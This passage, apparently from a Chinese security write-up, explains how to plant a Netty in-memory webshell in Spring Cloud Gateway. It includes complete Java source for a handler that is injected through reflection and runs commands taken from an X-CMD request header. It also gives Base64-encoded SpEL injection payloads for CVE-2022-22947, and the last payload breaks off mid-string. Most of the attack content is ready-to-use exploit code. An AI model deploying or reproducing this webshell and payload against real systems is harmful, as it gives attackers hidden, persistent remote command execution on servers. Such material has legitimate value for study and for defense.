configurer，也就是说：先执行默认 handler 配置，再执行恶意 handler 配置。\n这样就实现了 内存马植入 pipeline，每条 pipeline 都会自动包含你的 handler。\n总结一下：\nCompositeChannelPipelineConfigurer 是 pipeline configurer 合并器 默认情况下，返回的是 Spring Cloud Gateway 默认 configurer 如果能控制 other 参数：就能把自己的 configurer 合并进去，在 pipeline 初始化时添加恶意 handler 实现内存马 doOnChannelInit 是 pipeline 初始化钩子的存储点，可以用它找到线程对象 -\u0026gt; 进入 Netty 配置 -\u0026gt; 替换 / 注入自己的 configurer 核心思路是通过控制 Spring Cloud Gateway 的 doOnChannelInit（即 other configurer）来生成 composite configurer，从而在每条 pipeline 上注入自己的 handler，实现 Netty 内存马。\n3.2.3 最终的内存马 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 import io.netty.buffer.Unpooled; import io.netty.channel.*; import io.netty.handler.codec.http.*; import io.netty.util.CharsetUtil; import reactor.netty.ChannelPipelineConfigurer; import reactor.netty.ConnectionObserver; import java.lang.reflect.Array; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.net.SocketAddress; import java.util.Scanner; public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer { public static String doInject(){ String msg = \u0026#34;inject-start\u0026#34;; try { Method getThreads = Thread.class.getDeclaredMethod(\u0026#34;getThreads\u0026#34;); getThreads.setAccessible(true); Object threads = getThreads.invoke(null); for (int i = 0; i \u0026lt; Array.getLength(threads); i++) { Object thread = Array.get(threads, i); if (thread != null \u0026amp;\u0026amp; thread.getClass().getName().contains(\u0026#34;NettyWebServer\u0026#34;)) { Field _val$disposableServer = thread.getClass().getDeclaredField(\u0026#34;val$disposableServer\u0026#34;); _val$disposableServer.setAccessible(true); Object val$disposableServer = _val$disposableServer.get(thread); Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(\u0026#34;config\u0026#34;); _config.setAccessible(true); Object config = _config.get(val$disposableServer); Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(\u0026#34;doOnChannelInit\u0026#34;); _doOnChannelInit.setAccessible(true); _doOnChannelInit.set(config, new NettyMemshell()); msg = \u0026#34;inject-success\u0026#34;; } } }catch (Exception e){ msg = \u0026#34;inject-error\u0026#34;; } return msg; } @Override // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) { ChannelPipeline pipeline = channel.pipeline(); // 将内存马的handler添加到spring层handler的前面 pipeline.addBefore(\u0026#34;reactor.left.httpTrafficHandler\u0026#34;,\u0026#34;memshell_handler\u0026#34;,new NettyMemshell()); } @Override // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑 public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { if(msg instanceof HttpRequest){ HttpRequest httpRequest = (HttpRequest)msg; try { if(httpRequest.headers().contains(\u0026#34;X-CMD\u0026#34;)) { String cmd = httpRequest.headers().get(\u0026#34;X-CMD\u0026#34;); String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;).next(); // 返回执行结果 send(ctx, execResult, HttpResponseStatus.OK); return; } }catch (Exception e){ e.printStackTrace(); } } ctx.fireChannelRead(msg); } private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) { FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8)); response.headers().set(HttpHeaderNames.CONTENT_TYPE, \u0026#34;text/plain; charset=UTF-8\u0026#34;); ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE); } } 3.2.4 通过 CVE-2022-22947 的 SpEL 注入内存马 payload: 需要把上方的内存马编译为 class 文件，在经过 Base64 编码后，构建完整的 payload：(传的时候要把换行去掉！)\nplain\r1 2 3 4 5 6 7 #{T(org.springframework.cglib.core.ReflectUtils).defineClass( \u0026#39;NettyMemshell\u0026#39;, T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMY29tL25ldHR5L05ldHR5TWVtc2hlbGw7AQAIZG9JbmplY3QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFV92YWwkZGlzcG9zYWJsZVNlcnZlcgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABR2YWwkZGlzcG9zYWJsZVNlcnZlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB19jb25maWcBAAZjb25maWcBABBfZG9PbkNoYW5uZWxJbml0AQAGdGhyZWFkAQABaQEAAUkBAApnZXRUaHJlYWRzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAd0aHJlYWRzAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAMMHAMQBAA1vbkNoYW5uZWxJbml0AQBXKExyZWFjdG9yL25ldHR5L0Nvbm5lY3Rpb25PYnNlcnZlcjtMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsO0xqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOylWAQASY29ubmVjdGlvbk9ic2VydmVyAQAiTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyOwEAB2NoYW5uZWwBABpMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsOwEADXNvY2tldEFkZHJlc3MBABhMamF2YS9uZXQvU29ja2V0QWRkcmVzczsBAAhwaXBlbGluZQEAIkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBABBNZXRob2RQYXJhbWV0ZXJzAQALY2hhbm5lbFJlYWQBAD0oTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQADY21kAQAKZXhlY1Jlc3VsdAEAC2h0dHBSZXF1ZXN0AQApTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVxdWVzdDsBAANjdHgBAChMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAKRXhjZXB0aW9ucwEABHNlbmQBAG0oTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0O0xqYXZhL2xhbmcvU3RyaW5nO0xpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzOylWAQAHY29udGV4dAEABnN0YXR1cwEAMExpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzOwEACHJlc3BvbnNlAQAuTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9GdWxsSHR0cFJlc3BvbnNlOwEAClNvdXJjZUZpbGUBABJOZXR0eU1lbXNoZWxsLmphdmEMAEAAQQEADGluamVjdC1zdGFydAEAEGphdmEvbGFuZy9UaHJlYWQBAA9qYXZhL2xhbmcvQ2xhc3MMAMUAxgwAxwDIAQAQamF2YS9sYW5nL09iamVjdAwAyQDKBwDLDADMAM0MAM4AzwwA0ADRDADSAEgBAA5OZXR0eVdlYlNlcnZlcgwA0wDUDADVANYHANcMAM4A2AwA2QDRAQAPZG9PbkNoYW5uZWxJbml0AQAXY29tL25ldHR5L05ldHR5TWVtc2hlbGwMANoA2wEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADGluamVjdC1lcnJvcgcA3AwAZQDdAQAfcmVhY3Rvci5sZWZ0Lmh0dHBUcmFmZmljSGFuZGxlcgEAEG1lbXNoZWxsX2hhbmRsZXIHAN4MAN8A4AEAJ2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVxdWVzdAwA4QDiAQAFWC1DTUQHAOMMANMA5AwAzgDlAQARamF2YS91dGlsL1NjYW5uZXIHAOYMAOcA6AwA6QDqBwDrDADsAO0MAEAA7gEAAlxBDADvAPAMAPEASAcA8gwA8wB1DABxAHIMAPQAQQcA9QwA9gD3AQAzaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0RlZmF1bHRGdWxsSHR0cFJlc3BvbnNlBwD4DAD5APoHAPsMAPwA/QcA/gwA/wEADABAAQEHAQIHAQMMAQQBBQEAGXRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgMANoBBgwBBwEIBwEJDAEKAQsHAQwMAQ0BDgEAJWlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbER1cGxleEhhbmRsZXIBACdyZWFjdG9yL25ldHR5L0NoYW5uZWxQaXBlbGluZUNvbmZpZ3VyZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQEACWdldExlbmd0aAEAFShMamF2YS9sYW5nL09iamVjdDspSQEAA2dldAEAJyhMamF2YS9sYW5nL09iamVjdDtJKUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2dldE5hbWUBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZ2V0U3VwZXJjbGFzcwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAGGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbAEAJCgpTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAIGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lAQAJYWRkQmVmb3JlAQBpKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsUGlwZWxpbmU7AQAHaGVhZGVycwEAKygpTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyczsBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnMBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAuaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cwEAAk9LAQAPcHJpbnRTdGFja1RyYWNlAQAmaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQBAA9maXJlQ2hhbm5lbFJlYWQBADwoTGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFZlcnNpb24BAAhIVFRQXzFfMQEAKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFZlcnNpb247AQAZaW8vbmV0dHkvdXRpbC9DaGFyc2V0VXRpbAEABVVURl84AQAaTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsBABhpby9uZXR0eS9idWZmZXIvVW5wb29sZWQBAAxjb3BpZWRCdWZmZXIBAE0oTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspTGlvL25ldHR5L2J1ZmZlci9CeXRlQnVmOwEAdShMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uO0xpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzO0xpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjspVgEALGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9GdWxsSHR0cFJlc3BvbnNlAQAraW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJOYW1lcwEADENPTlRFTlRfVFlQRQEAG0xpby9uZXR0eS91dGlsL0FzY2lpU3RyaW5nOwEAVShMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyczsBAA13cml0ZUFuZEZsdXNoAQA0KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyAQAFQ0xPU0UBAChMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlTGlzdGVuZXI7AQAeaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlAQALYWRkTGlzdGVuZXIBAFIoTGlvL25ldHR5L3V0aWwvY29uY3VycmVudC9HZW5lcmljRnV0dXJlTGlzdGVuZXI7KUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmU7ACEAFwA+AAEAPwAAAAUAAQBAAEEAAQBCAAAALwABAAEAAAAFKrcAAbEAAAACAEMAAAAGAAEAAAAQAEQAAAAMAAEAAAAFAEUARgAAAAkARwBIAAEAQgAAAcMABAAKAAAAtRICSxIDEgQDvQAFtgAGTCsEtgAHKwEDvQAItgAJTQM+HSy4AAqiAIcsHbgACzoEGQTGAHUZBLYADLYADRIOtgAPmQBlGQS2AAwSELYAEToFGQUEtgASGQUZBLYAEzoGGQa2AAy2ABQSFbYAEToHGQcEtgASGQcZBrYAEzoIGQi2AAy2ABS2ABQSFrYAEToJGQkEtgASGQkZCLsAF1m3ABi2ABkSGkuEAwGn/3enAAdMEhxLKrAAAQADAKwArwAbAAMAQwAAAFoAFgAAABIAAwAUAA8AFQAUABYAHgAYACgAGQAvABoARAAbAFAAHABWAB0AXwAeAG4AHwB0ACAAfQAhAI8AIgCVACMAowAkAKYAGACsACkArwAnALAAKACzACoARAAAAHAACwBQAFYASQBKAAUAXwBHAEsATAAGAG4AOABNAEoABwB9ACkATgBMAAgAjwAXAE8ASgAJAC8AdwBQAEwABAAgAIwAUQBSAAMADwCdAFMAVAABAB4AjgBVAEwAAgCwAAMAVgBXAAEAAwCyAFgAWQAAAFoAAAAeAAX/ACAABAcAWwcAXAcACAEAAPsAhfgABUIHABsDAAEAXQBeAAIAQgAAAHYABQAFAAAAHCy5AB0BADoEGQQSHhIfuwAXWbcAGLkAIAQAV7EAAAACAEMAAAAOAAMAAAAwAAgAMgAbADMARAAAADQABQAAABwARQBGAAAAAAAcAF8AYAABAAAAHABhAGIAAgAAABwAYwBkAAMACAAUAGUAZgAEAGcAAAANAwBfAAAAYQAAAGMAAAABAGgAaQADAEIAAAEQAAQABgAAAGEswQAhmQBULMAAIU4tuQAiAQASI7YAJJkANy25ACIBABIjtgAlOgS7ACZZuAAnGQS2ACi2ACm3ACoSK7YALLYALToFKisZBbIALrcAL7GnAAo6BBkEtgAwKyy5ADECAFexAAEADABNAFEAGwADAEMAAAAyAAwAAAA5AAcAOgAMADwAGgA9ACcAPgBDAEAATQBBAE4ARQBRAEMAUwBEAFgARwBgAEgARAAAAEgABwAnACcAagBZAAQAQwALAGsAWQAFAFMABQBWAFcABAAMAEwAbABtAAMAAABhAEUARgAAAAAAYQBuAG8AAQAAAGEAWABMAAIAWgAAAA8AA/wATgcAIUIHABv6AAYAcAAAAAQAAQAbAGcAAAAJAgBuAAAAWAAAAAIAcQByAAIAQgAAAJQABgAFAAAANrsAMlmyADMtLLIANLgANbcANjoEGQS5ADcBALIAOBI5tgA6VysZBLkAOwIAsgA8uQA9AgBXsQAAAAIAQwAAABIABAAAAEwAFABNACQATgA1AE8ARAAAADQABQAAADYARQBGAAAAAAA2AG4AbwABAAAANgBzAFkAAgAAADYAdAB1AAMAFAAiAHYAdwAEAGcAAAANAwBuAAAAcwAAAHQAAAABAHgAAAACAHk=\u0026#39;), new javax.management.loading.MLet(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader()) ).doInject()} #{T(org.springframework.cglib.core.ReflectUtils).defineClass(\u0026#39;NettyMemshell\u0026#39;,T(org.springframework.util.Base64Utils).decodeFromString(\u0026#39;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVj